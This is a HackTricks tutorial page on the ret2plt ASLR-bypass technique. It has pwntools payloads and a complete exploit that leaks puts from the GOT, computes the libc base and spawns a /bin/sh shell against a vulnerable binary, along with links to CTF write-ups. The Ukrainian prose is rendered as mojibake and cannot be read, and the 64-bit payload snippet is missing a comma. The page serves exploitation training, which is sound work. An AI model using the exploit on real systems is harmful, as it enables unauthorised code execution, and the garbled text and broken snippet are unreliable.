# Ret2plt

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

–ú–µ—Ç–æ—é —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —î **–≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ –∑ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ PLT**, —â–æ–± –æ–±—ñ–π—Ç–∏ ASLR. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –≤–∏—Ç–µ—á–µ—Ç–µ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó `puts` –∑ libc, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–æ–±—á–∏—Å–ª–∏—Ç–∏, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –±–∞–∑–æ–≤–∞ –∞–¥—Ä–µ—Å–∞ `libc`** —ñ –æ–±—á–∏—Å–ª–∏—Ç–∏ –∑—Å—É–≤–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—à–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ **`system`**.

–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ—Ä–∏—Å–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è `pwntools`, —Ç–∞–∫–æ–≥–æ —è–∫ ([**–∑–≤—ñ–¥—Å–∏**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ **`puts`** (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∞–¥—Ä–µ—Å—É –∑ PLT) –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑ –∞–¥—Ä–µ—Å–æ—é `puts`, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ—é –≤ GOT (Global Offset Table). –¶–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ç–æ–º—É, —â–æ –¥–æ –º–æ–º–µ–Ω—Ç—É, –∫–æ–ª–∏ `puts` –≤–∏–≤–æ–¥–∏—Ç—å –∑–∞–ø–∏—Å GOT –¥–ª—è `puts`, —Ü–µ–π **–∑–∞–ø–∏—Å –º—ñ—Å—Ç–∏—Ç–∏–º–µ —Ç–æ—á–Ω—É –∞–¥—Ä–µ—Å—É `puts` –≤ –ø–∞–º'—è—Ç—ñ**.

–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –∞–¥—Ä–µ—Å–∞ `main` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –µ–∫—Å–ø–ª–æ–π—Ç—ñ, —â–æ–± –∫–æ–ª–∏ `puts` –∑–∞–∫—ñ–Ω—á—É—î —Å–≤–æ—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è, **–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –∑–Ω–æ–≤—É –≤–∏–∫–ª–∏–∫–∞–≤ `main`, –∞ –Ω–µ –∑–∞–≤–µ—Ä—à—É–≤–∞–≤—Å—è** (—Ç–∞–∫ —â–æ –≤–∏—Ç—ñ–∫ –∞–¥—Ä–µ—Å–∏ –∑–∞–ª–∏—à–∏—Ç—å—Å—è –¥—ñ–π—Å–Ω–∏–º).

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ç–æ–≥–æ, —â–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ, **–±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –∑ PIE** –∞–±–æ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ **–∑–Ω–∞–π—Ç–∏ –≤–∏—Ç—ñ–∫, —â–æ–± –æ–±—ñ–π—Ç–∏ PIE**, —â–æ–± –∑–Ω–∞—Ç–∏ –∞–¥—Ä–µ—Å—É PLT, GOT —ñ `main`. –í —ñ–Ω—à–æ–º—É –≤–∏–ø–∞–¥–∫—É, —Å–ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—ñ–π—Ç–∏ PIE.
{% endhint %}

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–ø–æ–≤–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ —Ü—å–æ–≥–æ –æ–±—Ö–æ–¥—É —Ç—É—Ç**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). –¶–µ –±—É–≤ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç –∑ —Ü—å–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## –Ü–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 –±—ñ—Ç–∏, ASLR —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –∞–ª–µ –±–µ–∑ PIE, –ø–µ—Ä—à–∏–π –∫—Ä–æ–∫ - –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –¥–æ –±–∞–π—Ç–∞ 0x00 –∫–∞–Ω–∞—Ä–∫–∏, —â–æ–± –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ puts —ñ –≤–∏—Ç—è–≥—Ç–∏ –π–æ–≥–æ. –ó –∫–∞–Ω–∞—Ä–∫–æ—é —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è ROP –≥–∞–¥–∂–µ—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É puts, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ –∞–¥—Ä–µ—Å—É puts –∑ GOT, –∞ –ø–æ—Ç—ñ–º ROP –≥–∞–¥–∂–µ—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 –±—ñ—Ç–∏, ASLR —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –±–µ–∑ –∫–∞–Ω–∞—Ä–∫–∏, –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Å—Ç–µ–∫—É –≤ main –∑ –¥–æ—á—ñ—Ä–Ω—å–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó. ROP –≥–∞–¥–∂–µ—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É puts, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ –∞–¥—Ä–µ—Å—É puts –∑ GOT, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –æ–¥–∏–Ω –≥–∞–¥–∂–µ—Ç.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
